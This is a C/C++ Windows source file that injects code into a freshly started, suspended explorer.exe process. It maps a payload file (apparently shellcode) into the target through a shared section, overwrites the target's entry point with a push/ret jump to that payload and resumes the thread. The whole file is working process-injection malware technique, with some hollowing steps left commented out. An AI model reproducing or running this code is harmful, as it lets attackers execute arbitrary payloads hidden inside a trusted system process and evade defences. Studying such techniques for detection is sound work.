#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD oldProtection = NULL;
	LPVOID lpHeaderBuffer[2048];

	const int baseAddrLength = 4;
	const int pebImageBaseAddrOffset = 8;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
	FARPROC fpZwCreateSection = GetProcAddress(handleNtDll, "ZwCreateSection");
	FARPROC fpZwMapViewOfSection = GetProcAddress(handleNtDll, "ZwMapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	_ZwCreateSection ZwCreateSection = (_ZwCreateSection)fpZwCreateSection;
	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection)fpZwMapViewOfSection;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed %i.\n", GetLastError());
	}


	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	/* Find and load exe stored in the PE's resource section */
	//HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	//HGLOBAL rescData = LoadResource(NULL, resc);

	/* Get pointer to the resource base address */
	//LPVOID lpmyResc = LockResource(rescData);

	HANDLE hFileYo = CreateFileA("C:\\Users\\pip\\Desktop\\yo.shc.exe", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE handleMappingYo = CreateFileMappingA(hFileYo, NULL, PAGE_READWRITE, 0, 0, NULL);
	LPVOID lpBaseYo = MapViewOfFile(handleMappingYo, FILE_MAP_ALL_ACCESS, 0, 0, 0);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseYo;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	HANDLE secHandle = NULL;

	LARGE_INTEGER pLargeInt;
	

	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;

	LPDWORD lpFileSizeHigh = NULL;
	SIZE_T commitSize = GetFileSize(hFileYo, lpFileSizeHigh);
	SIZE_T viewSizeCurrentProcess = 0;
	SIZE_T viewSizeCreatedPrcess = 0;

	PVOID sectionBaseAddressCurrentProcess = NULL;
	PVOID sectionBaseAddressCreatedProcess = NULL;//(PVOID)0x00400000;

	/* Create the section object which will be shared by both the current and created process */
	ZwCreateSection(&secHandle, SECTION_ALL_ACCESS, NULL, &pLargeInt, PAGE_EXECUTE_WRITECOPY, SEC_COMMIT, NULL);

	/* Map the created section into the current process's virtual address space */
	ZwMapViewOfSection(secHandle, GetCurrentProcess(), &sectionBaseAddressCurrentProcess, NULL, NULL, NULL, &viewSizeCurrentProcess, ViewShare, NULL, PAGE_EXECUTE_WRITECOPY);
	
	/* Map the created section into the created process's virtual address space */
	ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewShare, NULL, PAGE_EXECUTE_WRITECOPY);
	

	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);

	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddressCreatedProcess, lpBaseYo, commitSize, NULL))
	{
		printf("Failed:  %i", GetLastError());
		return -1;
	}
	

	/* Copy the headers of the process that is to be injected into the created process */
	/*
	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddressCreatedProcess, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
		return -1;
	}
	*/
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);

	
	/* Copy the sections of the process that is to be injected into the created process */
	/*
	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
	{
		printf("Copying data from: %s\n", pSectionHeader->Name);

		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];

		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)sectionBaseAddressCreatedProcess + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());

			return -1;
		}
		pSectionHeader++;
	}
	*/

	/* Unmap the shared section from the current process's virutal address space */
	//ZwUnmapViewOfSection(pi.hProcess, pPeb->ImageBaseAddress);

	/* Overwrite the PEB base address with the image base address of the injected exe */
	//WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &sectionBaseAddressCreatedProcess, baseAddrLength, NULL);

	/* Retrieve the memory associated with the */
	ReadProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, lpHeaderBuffer, 2048, NULL);

	PIMAGE_DOS_HEADER pDosHeaderCreatedProcess = (PIMAGE_DOS_HEADER)(LPVOID)lpHeaderBuffer;

	if (pDosHeaderCreatedProcess->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderCreatedProcess = (PIMAGE_NT_HEADERS)((DWORD)pDosHeaderCreatedProcess + (DWORD)pDosHeaderCreatedProcess->e_lfanew);

	BYTE opCodeBuffer[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		PAGE_EXECUTE_READWRITE,
		&oldProtection
	);

	DWORD resourceOEP = (DWORD)sectionBaseAddressCreatedProcess; //+ (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;

	memcpy(opCodeBuffer + 1, &resourceOEP, 4);

	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint), opCodeBuffer, sizeof(opCodeBuffer), NULL);

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		oldProtection,
		&oldProtection
	);

	printf("\nCreated Process id: %i\n", pi.dwProcessId);
	printf("Created Process Image Base Address: %x\n", pPeb->ImageBaseAddress);
	printf("Injected process Image Base Address 0x%x\n", sectionBaseAddressCreatedProcess);


	/* Resume the created processes main thread with the updated OEP */
	ResumeThread(pi.hThread);



	return 0;
}